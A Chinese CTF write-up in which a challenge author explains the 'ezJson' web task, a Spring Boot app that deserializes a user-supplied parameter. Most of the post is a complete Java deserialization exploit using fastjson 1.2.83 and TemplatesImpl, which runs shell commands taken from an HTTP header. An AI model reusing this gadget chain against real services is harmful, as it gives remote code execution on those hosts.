---
title: 记一次CTF出题之ezJson_WP篇
date: 2024-01-30 18:53:00 +0800
img_path: /
categories: [CTF, CTF出题记录]
tags: [CTF, CTF出题记录]   
---

# WEB-ezJson

## 一、查看题目信息

题目给出一个`jar`包，反编译后查看`Controller`层结构如下：



![image-20240130223120065](assets/image-20240130223120065.png)

## 二、题目分析

查看`IndexController`文件内容如下:

![image-20240130223412607](assets/image-20240130223412607.png)

查看`ReadController`文件内容如下:

![image-20240130223445932](assets/image-20240130223445932.png)

注意到该类中存在`readObject`方法且传入参数`data`可控，所以存在`Java反序列化漏洞`。



查看`pom.xml`文件内容如下：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.7.4</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>

    <groupId>com.polar.ctf</groupId>
    <artifactId>PolarCTF_ezJson</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.83</version>
        </dependency>

    </dependencies>
    <build>
        <finalName>ezJson</finalName>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>

</project>
```

注意到存在`fastjson 1.2.83`。可尝试使用`fastjson`的链子打。



`Poc`如下：

```java
package ysoserial.fastjson;

import com.alibaba.fastjson.JSONArray;
import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.*;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;


public class JsonPoc {
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static CtClass genPayload() throws NotFoundException, CannotCompileException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass clazz = classPool.makeClass("A");
        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addConstructor(CtNewConstructor.make("public B() throws Exception {\n" +
            "                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n" +
            "                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n" +
            "                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n" +
            "                String[] cmd =  new String[]{\"sh\", \"-c\", httprequest.getHeader(\"Cmd\")};\n" +
            "                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes();\n" +
            "                httpresponse.getWriter().write(new String(result));\n" +
            "                httpresponse.getWriter().flush();\n" +
            "                httpresponse.getWriter().close();\n" +
            "        }", clazz));
        // 兼容低版本jdk
        clazz.getClassFile().setMajorVersion(50);
        CtClass superClass = classPool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        return clazz;
    }

    public static void main(String[] args) throws Exception{


        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setValue(templates, "_bytecodes", new byte[][]{genPayload().toBytecode()});
        setValue(templates, "_name", "1");
        setValue(templates, "_tfactory", null);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
        setValue(bd,"val",jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(templates,bd);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashMap);
        byte[] bytes = byteArrayOutputStream.toByteArray();
        System.out.println(Base64.getEncoder().encodeToString(bytes));
        objectOutputStream.close();
    }
}
```

## 三、漏洞利用

运行`poc`生成`payload`并传入参数`data`（注意生成的字符串进行URL encode），同时编辑`Cmd`字段为所需执行的命令。

![image-20240130224356419](assets/image-20240130224356419.png)

